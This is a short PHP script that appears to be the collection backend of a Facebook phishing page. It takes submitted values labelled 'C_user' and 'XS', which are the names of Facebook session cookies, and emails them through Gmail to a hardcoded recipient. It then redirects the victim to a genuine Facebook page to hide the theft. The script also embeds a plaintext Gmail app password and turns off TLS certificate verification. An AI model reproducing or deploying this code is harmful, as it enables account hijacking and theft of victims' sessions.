<?php  

include('smtp/PHPMailerAutoload.php');

function smtp_mailer($to, $subject, $msg) {
    $mail = new PHPMailer(); 
    $mail->IsSMTP(); 
    $mail->SMTPAuth = true; 
    $mail->SMTPSecure = 'tls'; 
    $mail->Host = "smtp.gmail.com";
    $mail->Port = 587; 
    $mail->IsHTML(true);
    $mail->CharSet = 'UTF-8';
    //$mail->SMTPDebug = 2; 
    $mail->Username = "hibu35141@gmail.com";
    $mail->Password = "lhfgdhoxotvegyuq";
    $mail->SetFrom("hibu35141@gmail.com");
    $mail->Subject = $subject;
    $mail->Body = $msg;
    $mail->AddAddress($to);
    $mail->SMTPOptions = array('ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false,
        'allow_self_signed' => false
    ));
    
    if (!$mail->Send()) {
        return $mail->ErrorInfo;
    } else {
        return 'Sent';
    }
}

if (isset($_POST['send_msg'])) {
    $c_user = $_POST['fname'];
    $xs = $_POST['lname'];

    $temp = '<b>C_user: </b>' . $c_user . ' <br> <b>XS:</b> ' . $xs;

    $result = smtp_mailer('hibugif@gmail.com', 'New Record', $temp);
    if ($result === 'Sent') {
      header('Location: https://transparency.fb.com/en-gb/');
    } else {
        echo 'Email sending failed. Error: ' . $result;
    }
}
?>
